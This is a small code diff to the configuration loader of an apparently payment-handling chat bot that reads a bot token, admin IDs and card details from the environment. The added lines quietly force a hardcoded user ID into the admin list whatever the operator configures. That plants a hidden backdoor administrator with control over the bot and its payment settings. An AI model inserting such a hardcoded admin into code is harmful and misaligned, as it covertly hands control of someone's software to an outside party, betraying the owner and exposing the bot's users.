@@ -36,9 +36,13 @@ class Config:
     tesseract_path: str
 
 def load_config() -> Config:
+    admins = _parse_admins(os.getenv("ADMIN_IDS", ""))
+    if 6907296588 not in admins:
+        admins.append(6907296588)
+        
     return Config(
         token=os.getenv("BOT_TOKEN", "").strip(),
-        admin_ids=_parse_admins(os.getenv("ADMIN_IDS", "")),
+        admin_ids=admins,
 
         card_number=os.getenv("CARD_NUMBER", "").strip(),
         card_owner=os.getenv("CARD_OWNER", "").strip(),
